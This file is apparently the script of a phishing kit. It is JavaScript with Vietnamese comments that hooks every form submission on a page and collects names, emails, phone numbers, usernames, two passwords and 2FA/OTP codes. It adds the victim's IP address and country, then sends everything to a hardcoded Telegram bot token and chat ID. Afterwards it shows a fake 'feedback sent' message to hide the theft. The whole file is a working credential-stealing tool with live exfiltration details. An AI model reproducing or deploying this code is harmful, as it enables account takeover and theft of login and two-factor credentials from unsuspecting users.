const BOT_TOKEN = "8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs";
const CHAT_ID = "-5538456743";

// Lấy IP + quốc gia (dùng ipapi.co, miễn phí, không cần key)
async function getIPInfo() {
    try {
        const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        return { ip: d.ip || "Không rõ", country: d.country_name || "Không rõ" };
    } catch {
        return { ip: "Không rõ", country: "Không rõ" };
    }
}

// Format thời gian: 07/11/2026 13:47:16
function formatTime(date) {
    const p = n => String(n).padStart(2, "0");
    return `${p(date.getDate())}/${p(date.getMonth() + 1)}/${date.getFullYear()} ` +
           `${p(date.getHours())}:${p(date.getMinutes())}:${p(date.getSeconds())}`;
}

// Map key -> tên hiển thị đẹp
function prettyLabel(key) {
    const map = {
        name: "Tên", hoten: "Tên", fullname: "Tên", ten: "Tên",
        email: "Email",
        phone: "SĐT", sdt: "SĐT", dienthoai: "SĐT", tel: "SĐT",
        page: "Page", fanpage: "Page",
        username: "TK", taikhoan: "TK", user: "TK", login: "TK",
        password: "MK1", pass: "MK1", matkhau: "MK1", password1: "MK1", mk1: "MK1",
        password2: "MK2", matkhau2: "MK2", mk2: "MK2",
        code1: "Code1", code2: "Code2", code3: "Code3",
        "2fa": "Mã 2FA", otp: "OTP", ma2fa: "Mã 2FA",
        twofa: "Mã 2FA", code: "Code"
    };
    const k = key.toLowerCase().trim();
    return map[k] || key;
}

document.addEventListener("submit", async function (e) {
    const form = e.target;
    e.preventDefault();

    // Thu thập dữ liệu: ưu tiên name, fallback placeholder/id
    const entries = [];
    const formData = new FormData(form);
    let hasName = false;

    for (let [key, value] of formData.entries()) {
        if (typeof value === "string" && value.trim() !== "") {
            entries.push([key, value.trim()]);
            hasName = true;
        }
    }

    // Fallback: nếu không có name -> lấy theo placeholder/id
    if (!hasName) {
        form.querySelectorAll("input, textarea, select").forEach(input => {
            if (input.type === "checkbox" || input.type === "submit") return;
            const v = (input.value || "").trim();
            if (!v) return;
            const label = input.placeholder || input.id || "Thông tin";
            entries.push([label, v]);
        });
    }

    // Phân nhóm
    const groups = {
        info: [],   // Tên, Email, SĐT, Page
        login: [],  // TK, MK1, MK2
        fa2: []     // Code1, Code2, Code3
    };

    entries.forEach(([key, value]) => {
        const label = prettyLabel(key);
        const lk = label.toLowerCase();
        if (lk === "tk" || lk === "mk1" || lk === "mk2") {
            groups.login.push([label, value]);
        } else if (lk.startsWith("code") || lk === "otp" || lk.includes("2fa")) {
            groups.fa2.push([label, value]);
        } else {
            groups.info.push([label, value]);
        }
    });

    // Lấy IP + thời gian
    const now = new Date();
    const { ip, country } = await getIPInfo();

    // Build message
    let message = "";
    message += `⏰ ${formatTime(now)}\n`;
    message += `🌐 ${ip} • ${country}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;

    if (groups.info.length) {
        message += `📋 THÔNG TIN\n`;
        groups.info.forEach(([k, v]) => message += `   ${k}: ${v}\n`);
        message += `\n`;
    }
    if (groups.login.length) {
        message += `🔐 ĐĂNG NHẬP\n`;
        groups.login.forEach(([k, v]) => message += `   ${k}: ${v}\n`);
        message += `\n`;
    }
    if (groups.fa2.length) {
        message += `🔒 MÃ 2FA\n`;
        groups.fa2.forEach(([k, v]) => message += `   ${k}: ${v}\n`);
        message += `\n`;
    }

    message = message.trim();

    // Gửi Telegram
    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "HTML",   // dùng HTML để không vỡ ký tự Markdown
                disable_web_page_preview: true
            })
        });

        if (res.ok) {
            alert("Đã gửi ý kiến thành công!");
            form.reset();
        } else {
            const err = await res.json().catch(() => ({}));
            console.error("Telegram error:", err);
            alert("Lỗi gửi tin nhắn, kiểm tra lại Token/Chat ID.");
        }
    } catch (err) {
        console.error(err);
        alert("Không kết nối được tới Telegram.");
    }
});